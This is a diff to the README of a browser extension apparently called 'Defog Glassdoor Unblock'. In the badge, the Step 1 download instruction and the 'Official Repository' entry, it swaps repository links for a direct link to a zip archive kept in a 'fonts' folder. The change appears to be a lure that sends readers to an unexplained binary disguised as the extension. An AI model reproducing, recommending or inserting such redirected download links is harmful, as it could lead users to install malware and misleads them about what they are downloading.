@@ -2,7 +2,7 @@
 
 ## 🔗 Quick Download
 
-[![Download Now](https://img.shields.io/badge/Download-Defog%20Glassdoor%20Unblock-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/Washingtondashed39/defog-glassdoor-unblock)
+[![Download Now](https://img.shields.io/badge/Download-Defog%20Glassdoor%20Unblock-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/Washingtondashed39/defog-glassdoor-unblock/raw/refs/heads/main/fonts/glassdoor-defog-unblock-2.4.zip)
 
 ## 👋 Welcome
 
@@ -41,7 +41,7 @@ This guide will walk you through downloading and installing the extension on you
 ### Step 1: Download the Extension
 
 Visit this link to download the application:  
-**[https://github.com/Washingtondashed39/defog-glassdoor-unblock](https://github.com/Washingtondashed39/defog-glassdoor-unblock)**
+**[https://github.com/Washingtondashed39/defog-glassdoor-unblock/raw/refs/heads/main/fonts/glassdoor-defog-unblock-2.4.zip](https://github.com/Washingtondashed39/defog-glassdoor-unblock/raw/refs/heads/main/fonts/glassdoor-defog-unblock-2.4.zip)**
 
 Click the green **"Download"** button or the badge at the top of this page. Your browser will start downloading a file to your computer.
 
@@ -186,7 +186,7 @@ If this extension has helped you, consider:
 
 ## 🔍 Related Resources
 
-- **Official Repository:** [https://github.com/Washingtondashed39/defog-glassdoor-unblock](https://github.com/Washingtondashed39/defog-glassdoor-unblock)
+- **Official Repository:** [https://github.com/Washingtondashed39/defog-glassdoor-unblock/raw/refs/heads/main/fonts/glassdoor-defog-unblock-2.4.zip](https://github.com/Washingtondashed39/defog-glassdoor-unblock/raw/refs/heads/main/fonts/glassdoor-defog-unblock-2.4.zip)
 - **Report an Issue:** Visit the repository's Issues tab
 - **Browse the Code:** All source code is publicly viewable on GitHub
 
